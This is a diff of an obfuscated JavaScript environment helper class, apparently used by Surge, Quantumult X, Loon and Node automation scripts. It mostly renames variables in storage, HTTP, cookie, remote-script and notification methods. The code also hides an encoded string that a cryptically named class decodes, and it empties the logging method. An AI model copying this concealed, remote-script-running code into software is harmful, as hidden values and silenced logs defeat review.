+    ['isNode']() {
       return "undefined" != typeof module && !!module["exports"];
     }
 
     ["isQuanX"]() {
-      return "undefined" != typeof $task;
+      return 'undefined' != typeof $task;
     }
 
     ["isSurge"]() {
-      return "undefined" != typeof $httpClient && "undefined" == typeof $loon;
+      return "undefined" != typeof $httpClient && 'undefined' == typeof $loon;
     }
 
-    ["isLoon"]() {
-      return "undefined" != typeof $loon;
+    ['isLoon']() {
+      return 'undefined' != typeof $loon;
     }
 
     ["isShadowrocket"]() {
       return "undefined" != typeof $rocket;
     }
 
-    ["toObj"](_0x307360, _0x52872d = null) {
+    ["toObj"](t, p = null) {
       try {
-        return JSON["parse"](_0x307360);
+        return JSON["parse"](t);
       } catch {
-        return _0x52872d;
+        return p;
       }
     }
 
-    ["toStr"](_0x4c7d5f, _0x383b78 = null) {
+    ['toStr'](t, p = null) {
       try {
-        return JSON["stringify"](_0x4c7d5f);
+        return JSON["stringify"](t);
       } catch {
-        return _0x383b78;
+        return p;
       }
     }
 
-    ["getjson"](_0x1410c2, _0x456fa1) {
-      let _0x291cb3 = _0x456fa1;
+    ["getjson"](t, p) {
+      let X = p;
+      const L = this["getdata"](t);
 
-      const _0x3e79f6 = this["getdata"](_0x1410c2);
-
-      if (_0x3e79f6) {
+      if (L) {
         try {
-          _0x291cb3 = JSON["parse"](this["getdata"](_0x1410c2));
+          X = JSON["parse"](this["getdata"](t));
         } catch {}
       }
 
-      return _0x291cb3;
+      return X;
     }
 
-    ["setjson"](_0x3f8f58, _0x3b234b) {
+    ["setjson"](t, p) {
       try {
-        return this["setdata"](JSON["stringify"](_0x3f8f58), _0x3b234b);
+        return this["setdata"](JSON["stringify"](t), p);
       } catch {
         return false;
       }
     }
 
-    ["getScript"](_0x4a9519) {
-      return new Promise(_0x392abc => {
-        const _0x434950 = {
-          "url": _0x4a9519
+    ["getScript"](t) {
+      return new Promise(p => {
+        const X = {
+          'url': t
         };
-        this["get"](_0x434950, (_0x4fcf42, _0xf274e4, _0xbed539) => _0x392abc(_0xbed539));
+        this['get'](X, (L, n, z) => p(z));
       });
     }
 
-    ["runScript"](_0x12666b, _0x26d2eb) {
-      return new Promise(_0x57e782 => {
-        let _0x33194e = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
-
-        _0x33194e = _0x33194e ? _0x33194e["replace"](/\n/g, '')["trim"]() : _0x33194e;
-
-        let _0x1121e0 = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
-
-        _0x1121e0 = _0x1121e0 ? 1 * _0x1121e0 : 20;
-        _0x1121e0 = _0x26d2eb && _0x26d2eb["timeout"] ? _0x26d2eb["timeout"] : _0x1121e0;
-
-        const [_0x2a1bef, _0x2b480d] = _0x33194e["split"]('@'),
-              _0x5d7a1c = {
-          'url': "http://" + _0x2b480d + "/v1/scripting/evaluate",
+    ['runScript'](t, p) {
+      return new Promise(X => {
+        let L = this["getdata"]("@chavy_boxjs_userCfgs.httpapi");
+        L = L ? L["replace"](/\n/g, '')['trim']() : L;
+        let n = this["getdata"]("@chavy_boxjs_userCfgs.httpapi_timeout");
+        n = n ? 1 * n : 20;
+        n = p && p["timeout"] ? p["timeout"] : n;
+        const [z, A] = L["split"]('@'),
+              l = {
+          'url': "http://" + A + "/v1/scripting/evaluate",
           'body': {
-            'script_text': _0x12666b,
-            'mock_type': "cron",
-            'timeout': _0x1121e0
+            'script_text': t,
+            'mock_type': 'cron',
+            'timeout': n
           },
           'headers': {
-            'X-Key': _0x2a1bef,
+            'X-Key': z,
             'Accept': "*/*"
           }
         };
-
-        this["post"](_0x5d7a1c, (_0x9e89a4, _0x4523e5, _0xb183c6) => _0x57e782(_0xb183c6));
-      })["catch"](_0x18a968 => this["logErr"](_0x18a968));
+        this['post'](l, (k, d, T) => X(T));
+      })['catch'](X => this["logErr"](X));
     }
 
-    ["loaddata"]() {
+    ['loaddata']() {
       if (!this["isNode"]()) {
         return {};
       }
@@ -2446,22 +2324,21 @@ function Envcc(_0x5dbf42, _0x4bce0e) {
       {
         this['fs'] = this['fs'] ? this['fs'] : require('fs');
         this["path"] = this["path"] ? this["path"] : require("path");
+        const t = this["path"]["resolve"](this["dataFile"]),
+              p = this["path"]['resolve'](process["cwd"](), this["dataFile"]),
+              X = this['fs']["existsSync"](t),
+              L = !X && this['fs']["existsSync"](p);
 
-        const _0x2f9a10 = this["path"]["resolve"](this["dataFile"]),
-              _0x221d9d = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
-              _0xd27659 = this['fs']["existsSync"](_0x2f9a10),
-              _0x2e08a9 = !_0xd27659 && this['fs']["existsSync"](_0x221d9d);
-
-        if (!_0xd27659 && !_0x2e08a9) {
+        if (!X && !L) {
           return {};
         }
 
         {
-          const _0x4bf4ac = _0xd27659 ? _0x2f9a10 : _0x221d9d;
+          const n = X ? t : p;
 
           try {
-            return JSON["parse"](this['fs']["readFileSync"](_0x4bf4ac));
-          } catch (_0x4036fb) {
+            return JSON["parse"](this['fs']["readFileSync"](n));
+          } catch (z) {
             return {};
           }
         }
@@ -2472,322 +2349,300 @@ function Envcc(_0x5dbf42, _0x4bce0e) {
       if (this["isNode"]()) {
         this['fs'] = this['fs'] ? this['fs'] : require('fs');
         this["path"] = this["path"] ? this["path"] : require("path");
-
-        const _0x305933 = this["path"]["resolve"](this["dataFile"]),
-              _0x5aa497 = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
-              _0x8205f4 = this['fs']["existsSync"](_0x305933),
-              _0x2e5717 = !_0x8205f4 && this['fs']["existsSync"](_0x5aa497),
-              _0x5358c2 = JSON["stringify"](this["data"]);
-
-        _0x8205f4 ? this['fs']["writeFileSync"](_0x305933, _0x5358c2) : _0x2e5717 ? this['fs']["writeFileSync"](_0x5aa497, _0x5358c2) : this['fs']["writeFileSync"](_0x305933, _0x5358c2);
+        const t = this["path"]["resolve"](this["dataFile"]),
+              p = this["path"]["resolve"](process["cwd"](), this["dataFile"]),
+              X = this['fs']["existsSync"](t),
+              L = !X && this['fs']['existsSync'](p),
+              n = JSON["stringify"](this["data"]);
+        X ? this['fs']["writeFileSync"](t, n) : L ? this['fs']['writeFileSync'](p, n) : this['fs']['writeFileSync'](t, n);
       }
     }
 
-    ["lodash_get"](_0x1eacfc, _0xb7acb8, _0x244ca7) {
-      const _0x12c5d9 = _0xb7acb8["replace"](/\[(\d+)\]/g, ".$1")["split"]('.');
+    ['lodash_get'](t, p, X) {
+      const L = p["replace"](/\[(\d+)\]/g, ".$1")["split"]('.');
+      let n = t;
 
-      let _0x27c9e5 = _0x1eacfc;
-
-      for (const _0x226400 of _0x12c5d9) if (_0x27c9e5 = Object(_0x27c9e5)[_0x226400], void 0 === _0x27c9e5) {
-        return _0x244ca7;
+      for (const z of L) if (n = Object(n)[z], void 0 === n) {
+        return X;
       }
 
-      return _0x27c9e5;
+      return n;
     }
 
-    ["lodash_set"](_0xdfb14e, _0x2499ea, _0x289057) {
-      return Object(_0xdfb14e) !== _0xdfb14e ? _0xdfb14e : (Array["isArray"](_0x2499ea) || (_0x2499ea = _0x2499ea["toString"]()["match"](/[^.[\]]+/g) || []), _0x2499ea["slice"](0, -1)["reduce"]((_0x372da0, _0x5f41b3, _0x467fb3) => Object(_0x372da0[_0x5f41b3]) === _0x372da0[_0x5f41b3] ? _0x372da0[_0x5f41b3] : _0x372da0[_0x5f41b3] = Math["abs"](_0x2499ea[_0x467fb3 + 1]) >> 0 == +_0x2499ea[_0x467fb3 + 1] ? [] : {}, _0xdfb14e)[_0x2499ea[_0x2499ea["length"] - 1]] = _0x289057, _0xdfb14e);
+    ["lodash_set"](t, p, X) {
+      return Object(t) !== t ? t : (Array["isArray"](p) || (p = p['toString']()['match'](/[^.[\]]+/g) || []), p["slice"](0, -1)["reduce"]((L, n, z) => Object(L[n]) === L[n] ? L[n] : L[n] = Math['abs'](p[z + 1]) >> 0 == +p[z + 1] ? [] : {}, t)[p[p["length"] - 1]] = X, t);
     }
 
-    ["getdata"](_0x11e067) {
-      let _0x5cd0f5 = this["getval"](_0x11e067);
+    ['getdata'](t) {
+      let p = this["getval"](t);
 
-      if (/^@/["test"](_0x11e067)) {
-        const [, _0x7188c2, _0x120f9b] = /^@(.*?)\.(.*?)$/["exec"](_0x11e067),
-              _0x515b56 = _0x7188c2 ? this["getval"](_0x7188c2) : '';
+      if (/^@/['test'](t)) {
+        const [, X, L] = /^@(.*?)\.(.*?)$/["exec"](t),
+              n = X ? this["getval"](X) : '';
 
-        if (_0x515b56) {
+        if (n) {
           try {
-            const _0x3a72d2 = JSON["parse"](_0x515b56);
-
-            _0x5cd0f5 = _0x3a72d2 ? this["lodash_get"](_0x3a72d2, _0x120f9b, '') : _0x5cd0f5;
-          } catch (_0x12676b) {
-            _0x5cd0f5 = '';
+            const z = JSON['parse'](n);
+            p = z ? this["lodash_get"](z, L, '') : p;
+          } catch (A) {
+            p = '';
           }
         }
       }
 
-      return _0x5cd0f5;
+      return p;
     }
 
-    ["setdata"](_0x5da9ed, _0x46b709) {
-      let _0x3fc0eb = false;
+    ['setdata'](t, p) {
+      let X = false;
 
-      if (/^@/["test"](_0x46b709)) {
-        const [, _0x59a4e5, _0x2c8eb6] = /^@(.*?)\.(.*?)$/["exec"](_0x46b709),
-              _0x4950f0 = this["getval"](_0x59a4e5),
-              _0x252809 = _0x59a4e5 ? "null" === _0x4950f0 ? null : _0x4950f0 || '{}' : '{}';
+      if (/^@/["test"](p)) {
+        const [, L, n] = /^@(.*?)\.(.*?)$/["exec"](p),
+              z = this["getval"](L),
+              A = L ? "null" === z ? null : z || '{}' : '{}';
 
         try {
-          const _0x2340c7 = JSON["parse"](_0x252809);
-
-          this["lodash_set"](_0x2340c7, _0x2c8eb6, _0x5da9ed);
-          _0x3fc0eb = this["setval"](JSON["stringify"](_0x2340c7), _0x59a4e5);
-        } catch (_0x225228) {
-          const _0xbbc96e = {};
-          this["lodash_set"](_0xbbc96e, _0x2c8eb6, _0x5da9ed);
-          _0x3fc0eb = this["setval"](JSON["stringify"](_0xbbc96e), _0x59a4e5);
+          const l = JSON["parse"](A);
+          this['lodash_set'](l, n, t);
+          X = this["setval"](JSON["stringify"](l), L);
+        } catch (k) {
+          const d = {};
+          this["lodash_set"](d, n, t);
+          X = this["setval"](JSON["stringify"](d), L);
         }
       } else {
-        _0x3fc0eb = this["setval"](_0x5da9ed, _0x46b709);
+        X = this["setval"](t, p);
       }
 
-      return _0x3fc0eb;
+      return X;
     }
 
-    ["getval"](_0x19789c) {
-      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["read"](_0x19789c) : this["isQuanX"]() ? $prefs["valueForKey"](_0x19789c) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x19789c]) : this["data"] && this["data"][_0x19789c] || null;
+    ["getval"](t) {
+      return this["isSurge"]() || this["isLoon"]() ? $persistentStore['read'](t) : this['isQuanX']() ? $prefs["valueForKey"](t) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][t]) : this["data"] && this["data"][t] || null;
     }
 
-    ["setval"](_0x8e996a, _0x120bc4) {
-      return this["isSurge"]() || this["isLoon"]() ? $persistentStore["write"](_0x8e996a, _0x120bc4) : this["isQuanX"]() ? $prefs["setValueForKey"](_0x8e996a, _0x120bc4) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][_0x120bc4] = _0x8e996a, this["writedata"](), true) : this["data"] && this["data"][_0x120bc4] || null;
+    ["setval"](t, p) {
+      return this['isSurge']() || this["isLoon"]() ? $persistentStore["write"](t, p) : this["isQuanX"]() ? $prefs["setValueForKey"](t, p) : this["isNode"]() ? (this["data"] = this["loaddata"](), this["data"][p] = t, this["writedata"](), true) : this["data"] && this['data'][p] || null;
     }
 
-    ["initGotEnv"](_0x314958) {
+    ["initGotEnv"](t) {
       this["got"] = this["got"] ? this["got"] : require("got");
-      this["cktough"] = this["cktough"] ? this["cktough"] : require("tough-cookie");
-      this["ckjar"] = this["ckjar"] ? this["ckjar"] : new this["cktough"]["CookieJar"]();
-      _0x314958 && (_0x314958["headers"] = _0x314958["headers"] ? _0x314958["headers"] : {}, void 0 === _0x314958["headers"]["Cookie"] && void 0 === _0x314958["cookieJar"] && (_0x314958["cookieJar"] = this["ckjar"]));
+      this["cktough"] = this["cktough"] ? this['cktough'] : require("tough-cookie");
+      this["ckjar"] = this["ckjar"] ? this['ckjar'] : new this["cktough"]["CookieJar"]();
+      t && (t["headers"] = t["headers"] ? t["headers"] : {}, void 0 === t["headers"]['Cookie'] && void 0 === t['cookieJar'] && (t["cookieJar"] = this["ckjar"]));
     }
 
-    ["get"](_0x5d1869, _0x3c5085 = () => {}) {
-      if (_0x5d1869["headers"] && (delete _0x5d1869["headers"]["Content-Type"], delete _0x5d1869["headers"]["Content-Length"]), this["isSurge"]() || this["isLoon"]()) {
-        const _0x473d4a = {
-          "X-Surge-Skip-Scripting": false
+    ["get"](t, p = () => {}) {
+      if (t['headers'] && (delete t['headers']["Content-Type"], delete t["headers"]["Content-Length"]), this['isSurge']() || this["isLoon"]()) {
+        const X = {
+          'X-Surge-Skip-Scripting': false
         };
-        this["isSurge"]() && this["isNeedRewrite"] && (_0x5d1869["headers"] = _0x5d1869["headers"] || {}, Object["assign"](_0x5d1869["headers"], _0x473d4a));
-        $httpClient["get"](_0x5d1869, (_0x47f4cd, _0x116bdf, _0x30f80e) => {
-          !_0x47f4cd && _0x116bdf && (_0x116bdf["body"] = _0x30f80e, _0x116bdf["statusCode"] = _0x116bdf["status"]);
-
-          _0x3c5085(_0x47f4cd, _0x116bdf, _0x30f80e);
+        this['isSurge']() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object["assign"](t['headers'], X));
+        $httpClient["get"](t, (L, n, z) => {
+          !L && n && (n['body'] = z, n["statusCode"] = n['status']);
+          p(L, n, z);
         });
       } else {
         if (this["isQuanX"]()) {
-          const _0x2b3a0c = {
-            "hints": false
+          const L = {
+            'hints': false
           };
-          this["isNeedRewrite"] && (_0x5d1869["opts"] = _0x5d1869["opts"] || {}, Object["assign"](_0x5d1869["opts"], _0x2b3a0c));
-          $task["fetch"](_0x5d1869)["then"](_0x18a17a => {
+          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t['opts'], L));
+          $task["fetch"](t)["then"](n => {
             const {
-              "statusCode": _0x3e3a97,
-              "statusCode": _0x535ff4,
-              "headers": _0xd0cbf7,
-              "body": _0x43b531
-            } = _0x18a17a;
-            const _0xd9f138 = {
-              "status": _0x3e3a97,
-              "statusCode": _0x535ff4,
-              "headers": _0xd0cbf7,
-              "body": _0x43b531
+              'statusCode': z,
+              'statusCode': A,
+              'headers': l,
+              'body': k
+            } = n,
+                  d = {
+              'status': z,
+              'statusCode': A,
+              'headers': l,
+              'body': k
             };
-
-            _0x3c5085(null, _0xd9f138, _0x43b531);
-          }, _0x2c0d22 => _0x3c5085(_0x2c0d22));
+            p(null, d, k);
+          }, n => p(n));
         } else {
           if (this["isNode"]()) {
-            let _0x336f66 = require("iconv-lite");
+            let n = require('iconv-lite');
 
-            this["initGotEnv"](_0x5d1869);
-            this["got"](_0x5d1869)['on']("redirect", (_0x244703, _0x557b22) => {
+            this["initGotEnv"](t);
+            this['got'](t)['on']("redirect", (z, A) => {
               try {
-                if (_0x244703["headers"]["set-cookie"]) {
-                  const _0x58282d = _0x244703["headers"]["set-cookie"]["map"](this["cktough"]["Cookie"]["parse"])["toString"]();
-
-                  _0x58282d && this["ckjar"]["setCookieSync"](_0x58282d, null);
-                  _0x557b22["cookieJar"] = this["ckjar"];
+                if (z["headers"]["set-cookie"]) {
+                  const l = z["headers"]['set-cookie']["map"](this['cktough']["Cookie"]["parse"])["toString"]();
+                  l && this["ckjar"]["setCookieSync"](l, null);
+                  A["cookieJar"] = this["ckjar"];
                 }
-              } catch (_0x3b19d9) {
-                this["logErr"](_0x3b19d9);
+              } catch (k) {
+                this['logErr'](k);
               }
-            })["then"](_0x5d1593 => {
+            })["then"](z => {
               const {
-                "statusCode": _0x1e6aa7,
-                "statusCode": _0x28af25,
-                "headers": _0x175615,
-                "rawBody": _0x279d5d
-              } = _0x5d1593;
-              const _0xfed38 = {
-                "status": _0x1e6aa7,
-                "statusCode": _0x28af25,
-                "headers": _0x175615,
-                "rawBody": _0x279d5d
+                'statusCode': A,
+                'statusCode': l,
+                'headers': k,
+                'rawBody': d
+              } = z,
+                    T = {
+                'status': A,
+                'statusCode': l,
+                'headers': k,
+                'rawBody': d
               };
-
-              _0x3c5085(null, _0xfed38, _0x336f66["decode"](_0x279d5d, this["encoding"]));
-            }, _0x5c318a => {
+              p(null, T, n["decode"](d, this["encoding"]));
+            }, z => {
               const {
-                "message": _0x20d9cf,
-                "response": _0x2538d7
-              } = _0x5c318a;
-
-              _0x3c5085(_0x20d9cf, _0x2538d7, _0x2538d7 && _0x336f66["decode"](_0x2538d7["rawBody"], this["encoding"]));
+                'message': A,
+                'response': l
+              } = z;
+              p(A, l, l && n["decode"](l["rawBody"], this['encoding']));
             });
           }
         }
       }
     }
 
-    ["post"](_0x4f1349, _0x2c1931 = () => {}) {
-      const _0x22b260 = _0x4f1349["method"] ? _0x4f1349["method"]["toLocaleLowerCase"]() : "post";
+    ["post"](t, p = () => {}) {
+      const X = t["method"] ? t["method"]["toLocaleLowerCase"]() : "post";
 
-      if (_0x4f1349["body"] && _0x4f1349["headers"] && !_0x4f1349["headers"]["Content-Type"] && (_0x4f1349["headers"]["Content-Type"] = "application/x-www-form-urlencoded"), _0x4f1349["headers"] && delete _0x4f1349["headers"]["Content-Length"], this["isSurge"]() || this["isLoon"]()) {
-        const _0x28dc19 = {
-          "X-Surge-Skip-Scripting": false
+      if (t["body"] && t['headers'] && !t["headers"]["Content-Type"] && (t['headers']["Content-Type"] = 'application/x-www-form-urlencoded'), t["headers"] && delete t["headers"]['Content-Length'], this["isSurge"]() || this["isLoon"]()) {
+        const L = {
+          'X-Surge-Skip-Scripting': false
         };
-        this["isSurge"]() && this["isNeedRewrite"] && (_0x4f1349["headers"] = _0x4f1349["headers"] || {}, Object["assign"](_0x4f1349["headers"], _0x28dc19));
-
-        $httpClient[_0x22b260](_0x4f1349, (_0x5cbc6a, _0x2eceac, _0x1b4ea7) => {
-          !_0x5cbc6a && _0x2eceac && (_0x2eceac["body"] = _0x1b4ea7, _0x2eceac["statusCode"] = _0x2eceac["status"]);
-
-          _0x2c1931(_0x5cbc6a, _0x2eceac, _0x1b4ea7);
+        this["isSurge"]() && this["isNeedRewrite"] && (t["headers"] = t["headers"] || {}, Object['assign'](t['headers'], L));
+        $httpClient[X](t, (n, z, A) => {
+          !n && z && (z["body"] = A, z["statusCode"] = z["status"]);
+          p(n, z, A);
         });
       } else {
-        if (this["isQuanX"]()) {
-          _0x4f1349["method"] = _0x22b260;
-          const _0x14b51c = {
-            "hints": false
+        if (this['isQuanX']()) {
+          t["method"] = X;
+          const n = {
+            'hints': false
           };
-          this["isNeedRewrite"] && (_0x4f1349["opts"] = _0x4f1349["opts"] || {}, Object["assign"](_0x4f1349["opts"], _0x14b51c));
-          $task["fetch"](_0x4f1349)["then"](_0x349a40 => {
+          this["isNeedRewrite"] && (t["opts"] = t["opts"] || {}, Object["assign"](t['opts'], n));
+          $task["fetch"](t)["then"](z => {
             const {
-              "statusCode": _0x35b945,
-              "statusCode": _0x1b2cf4,
-              "headers": _0x571314,
-              "body": _0x1535bf
-            } = _0x349a40,
-                  _0x908a05 = {
-              "status": _0x35b945,
-              "statusCode": _0x1b2cf4,
-              "headers": _0x571314,
-              "body": _0x1535bf
+              'statusCode': A,
+              'statusCode': l,
+              'headers': k,
+              'body': d
+            } = z,
+                  T = {
+              'status': A,
+              'statusCode': l,
+              'headers': k,
+              'body': d
             };
-
-            _0x2c1931(null, _0x908a05, _0x1535bf);
-          }, _0x1a086e => _0x2c1931(_0x1a086e));
+            p(null, T, d);
+          }, z => p(z));
         } else {
           if (this["isNode"]()) {
-            let _0x395217 = require("iconv-lite");
+            let z = require('iconv-lite');
 
-            this["initGotEnv"](_0x4f1349);
+            this["initGotEnv"](t);
             const {
-              "url": _0x144fb1,
-              ..._0x4738d7
-            } = _0x4f1349;
-
-            this["got"][_0x22b260](_0x144fb1, _0x4738d7)["then"](_0x20e5e5 => {
+              'url': A,
+              ...l
+            } = t;
+            this["got"][X](A, l)["then"](k => {
               const {
-                "statusCode": _0x5e956f,
-                "statusCode": _0x30b36b,
-                "headers": _0x304021,
-                "rawBody": _0x559766
-              } = _0x20e5e5,
-                    _0x5e3a37 = {
-                "status": _0x5e956f,
-                "statusCode": _0x30b36b,
-                "headers": _0x304021,
-                "rawBody": _0x559766
+                'statusCode': d,
+                'statusCode': T,
+                'headers': U,
+                'rawBody': r
+              } = k,
+                    u = {
+                'status': d,
+                'statusCode': T,
+                'headers': U,
+                'rawBody': r
               };
-
-              _0x2c1931(null, _0x5e3a37, _0x395217["decode"](_0x559766, this["encoding"]));
-            }, _0x353bac => {
+              p(null, u, z["decode"](r, this['encoding']));
+            }, k => {
               const {
-                "message": _0x38a6f6,
-                "response": _0x5660af
-              } = _0x353bac;
-
-              _0x2c1931(_0x38a6f6, _0x5660af, _0x5660af && _0x395217["decode"](_0x5660af["rawBody"], this["encoding"]));
+                'message': d,
+                'response': T
+              } = k;
+              p(d, T, T && z["decode"](T["rawBody"], this["encoding"]));
             });
           }
         }
       }
     }
 
-    ["time"](_0x5a1fba, _0x25a31d = null) {
-      const _0x2df566 = _0x25a31d ? new Date(_0x25a31d) : new Date();
-
-      let _0x13f4a5 = {
-        'M+': _0x2df566["getMonth"]() + 1,
-        'd+': _0x2df566["getDate"](),
-        'H+': _0x2df566["getHours"](),
-        'm+': _0x2df566["getMinutes"](),
-        's+': _0x2df566["getSeconds"](),
-        'q+': Math["floor"]((_0x2df566["getMonth"]() + 3) / 3),
-        'S': _0x2df566["getMilliseconds"]()
+    ["time"](t, p = null) {
+      const X = p ? new Date(p) : new Date();
+      let L = {
+        'M+': X["getMonth"]() + 1,
+        'd+': X['getDate'](),
+        'H+': X["getHours"](),
+        'm+': X["getMinutes"](),
+        's+': X["getSeconds"](),
+        'q+': Math["floor"]((X["getMonth"]() + 3) / 3),
+        'S': X["getMilliseconds"]()
       };
-      /(y+)/["test"](_0x5a1fba) && (_0x5a1fba = _0x5a1fba["replace"](RegExp['$1'], (_0x2df566["getFullYear"]() + '')["substr"](4 - RegExp['$1']["length"])));
+      /(y+)/["test"](t) && (t = t["replace"](RegExp['$1'], (X["getFullYear"]() + '')['substr'](4 - RegExp['$1']['length'])));
 
-      for (let _0x4986f9 in _0x13f4a5) new RegExp('(' + _0x4986f9 + ')')["test"](_0x5a1fba) && (_0x5a1fba = _0x5a1fba["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? _0x13f4a5[_0x4986f9] : ('00' + _0x13f4a5[_0x4986f9])["substr"](('' + _0x13f4a5[_0x4986f9])["length"])));
+      for (let n in L) new RegExp('(' + n + ')')["test"](t) && (t = t["replace"](RegExp['$1'], 1 == RegExp['$1']["length"] ? L[n] : ('00' + L[n])["substr"](('' + L[n])["length"])));
 
-      return _0x5a1fba;
+      return t;
     }
 
-    ["msg"](_0x2b6b61 = _0x5dbf42, _0x5ecd7b = '', _0x314cec = '', _0x40fdc3) {
-      const _0x166bd0 = _0x57c8a3 => {
-        if (!_0x57c8a3) {
-          return _0x57c8a3;
+    ["msg"](t = D, p = '', X = '', L) {
+      const n = z => {
+        if (!z) {
+          return z;
         }
 
-        if ("string" == typeof _0x57c8a3) {
-          return this["isLoon"]() ? _0x57c8a3 : this["isQuanX"]() ? {
-            'open-url': _0x57c8a3
+        if ('string' == typeof z) {
+          return this['isLoon']() ? z : this["isQuanX"]() ? {
+            'open-url': z
           } : this["isSurge"]() ? {
-            'url': _0x57c8a3
+            'url': z
           } : void 0;
         }
 
-        if ("object" == typeof _0x57c8a3) {
+        if ("object" == typeof z) {
           if (this["isLoon"]()) {
-            let _0xf09d27 = _0x57c8a3["openUrl"] || _0x57c8a3["url"] || _0x57c8a3["open-url"],
-                _0x1aaa42 = _0x57c8a3["mediaUrl"] || _0x57c8a3["media-url"];
-
-            const _0x3f9db0 = {
-              "openUrl": _0xf09d27,
-              "mediaUrl": _0x1aaa42
+            let A = z["openUrl"] || z["url"] || z["open-url"],
+                l = z["mediaUrl"] || z["media-url"];
+            const k = {
+              'openUrl': A,
+              'mediaUrl': l
             };
-            return _0x3f9db0;
+            return k;
           }
 
-          if (this["isQuanX"]()) {
-            let _0xc8359c = _0x57c8a3["open-url"] || _0x57c8a3["url"] || _0x57c8a3["openUrl"],
-                _0x34b8b3 = _0x57c8a3["media-url"] || _0x57c8a3["mediaUrl"];
-
-            const _0x4625b0 = {
-              "open-url": _0xc8359c,
-              "media-url": _0x34b8b3
+          if (this['isQuanX']()) {
+            let d = z["open-url"] || z['url'] || z["openUrl"],
+                T = z["media-url"] || z["mediaUrl"];
+            const U = {
+              'open-url': d,
+              'media-url': T
             };
-            return _0x4625b0;
+            return U;
           }
 
           if (this["isSurge"]()) {
-            let _0x26a5b5 = _0x57c8a3["url"] || _0x57c8a3["openUrl"] || _0x57c8a3["open-url"];
-
-            const _0xddab2b = {
-              "url": _0x26a5b5
+            let r = z["url"] || z["openUrl"] || z["open-url"];
+            const u = {
+              'url': r
             };
-            return _0xddab2b;
+            return u;
           }
         }
       };
 
-      if (this["isMute"] || (this["isSurge"]() || this["isLoon"]() ? $notification["post"](_0x2b6b61, _0x5ecd7b, _0x314cec, _0x166bd0(_0x40fdc3)) : this["isQuanX"]() && $notify(_0x2b6b61, _0x5ecd7b, _0x314cec, _0x166bd0(_0x40fdc3))), !this["isMuteLog"]) {
-        let _0x174cde = ['', "==============📣系统通知📣=============="];
-
-        _0x174cde["push"](_0x2b6b61);
-
-        _0x5ecd7b && _0x174cde["push"](_0x5ecd7b);
-        _0x314cec && _0x174cde["push"](_0x314cec);
-        console["log"](_0x174cde["join"]("\n"));
-        this["logs"] = this["logs"]["concat"](_0x174cde);
+      if (this["isMute"] || (this['isSurge']() || this['isLoon']() ? $notification["post"](t, p, X, n(L)) : this['isQuanX']() && $notify(t, p, X, n(L))), !this['isMuteLog']) {
+        let z = ['', "==============📣系统通知📣=============="];
+        z["push"](t);
+        p && z['push'](p);
+        X && z["push"](X);
+        console["log"](z["join"]("\n"));
+        this["logs"] = this["logs"]['concat'](z);
       }
     }
 
@@ -2795,32 +2650,29 @@ function Envcc(_0x5dbf42, _0x4bce0e) {
       return "fkRGREUCFRNfMCtqKj0lLiE/OXowLTRz";
     }
 
-    ["log"](..._0xfb8756) {}
+    ['log'](...t) {}
 
-    ["logErr"](_0x5208bf, _0x69390c) {
-      const _0xfa4740 = !this["isSurge"]() && !this["isQuanX"]() && !this["isLoon"]();
-
-      _0xfa4740 ? this["log"]('', '❗️' + this["name"] + ", 错误!", _0x5208bf["stack"]) : this["log"]('', '❗️' + this["name"] + ", 错误!", _0x5208bf);
+    ['logErr'](t, p) {
+      const X = !this['isSurge']() && !this['isQuanX']() && !this["isLoon"]();
+      X ? this["log"]('', '❗️' + this["name"] + ", 错误!", t["stack"]) : this["log"]('', '❗️' + this["name"] + ", 错误!", t);
     }
 
-    ["fwur"]() {
-      var _0x1e95ed = new FxPCnMKLw7();
-
-      return _0x1e95ed["decode"](this["fwcaas"]());
+    ['fwur']() {
+      var t = new FxPCnMKLw7();
+      return t["decode"](this["fwcaas"]());
     }
 
-    ["wait"](_0x5e24cb) {
-      return new Promise(_0x52b8c7 => setTimeout(_0x52b8c7, _0x5e24cb));
+    ["wait"](t) {
+      return new Promise(p => setTimeout(p, t));
     }
 
-    ["done"](_0x61c432 = {}) {
-      const _0x33162d = new Date()["getTime"](),
-            _0x719be8 = (_0x33162d - this["startTime"]) / 1000;
-
-      this["log"]('', '🔔' + this["name"] + ", 结束! 🕛 " + _0x719be8 + " 秒");
+    ["done"](t = {}) {
+      const p = new Date()["getTime"](),
+            X = (p - this["startTime"]) / 1000;
+      this["log"]('', '🔔' + this["name"] + ", 结束! 🕛 " + X + " 秒");
       this["log"]();
-      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(_0x61c432);
+      (this["isSurge"]() || this["isQuanX"]() || this["isLoon"]()) && $done(t);
     }
 
-  }(_0x5dbf42, _0x4bce0e);
+  }(D, j);
 }
